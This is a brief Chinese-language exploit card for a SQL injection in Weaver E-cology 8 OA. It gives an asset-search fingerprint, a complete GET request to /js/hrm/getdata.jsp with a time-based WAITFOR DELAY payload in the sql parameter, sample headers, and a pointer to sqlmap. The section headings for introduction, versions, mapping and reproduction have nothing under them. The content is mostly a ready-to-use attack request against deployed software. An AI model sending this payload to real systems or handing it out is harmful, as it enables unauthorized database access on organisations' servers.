# 泛微E-cology8getdata存在SQL注入漏洞

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="泛微 e-cology OA"`
- **请求**：`GET /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=WAITFOR+DELAY+%270%3A0%3A5%27 HTTP/1.1`
- **关键头**：`Host: 192.168.31.127:81`　`Cookie: ecology_JSessionId=abcdTYJZpKflG5NUo9X0y; testBanCookie=test`

**请求体 / payload**
```

sqlmap
/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=
```

**其他**
- 泛微E-cology 8 getdata 存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微e-cology 8